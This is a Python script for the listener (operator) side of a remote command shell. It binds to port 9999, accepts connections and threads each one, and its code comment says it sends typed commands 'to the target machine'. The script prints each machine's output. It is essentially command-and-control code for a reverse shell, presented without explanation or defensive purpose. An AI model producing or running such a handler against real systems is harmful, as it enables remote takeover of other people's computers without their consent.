import socket
import sys
import os
import threading

# Create a socket
def socket_create():
    try:
        global host
        global port
        global server
        host = ""
        port = 9999
        server = socket.socket()
    except socket.error as msg:
        print(f"Socket creation error: {msg}")
        sys.exit()

# Binding the socket with the port
def socket_bind():
    try:
        print(f"Binding the socket to the port: {port}")
        server.bind((host, port))
        server.listen(5)
    except socket.error as msg:
        print(f"Socket binding error: {msg}\nRetrying...")
        socket_bind()

# Accepting the connection
def socket_accept():
    while True:
        conn, addr = server.accept()
        print(f"Connection established with {addr}")
        threading.Thread(target=send_command, args=(conn,)).start()

# Sending command to the target machine
def send_command(conn):
    try:
        while True:
            cmd = input(f"{os.getcwd()}~# ")
            if cmd == "exit":
                conn.close()
                server.close()
                sys.exit()
            if len(cmd) > 0:
                conn.send(cmd.encode())
                client_response = conn.recv(1024).decode("utf-8")
                print(client_response)
    except socket.error as msg:
        print(f"Connection error: {msg}")
        conn.close()

# Main function
def main():
    socket_create()
    socket_bind()
    socket_accept()

if __name__ == "__main__":
    main()

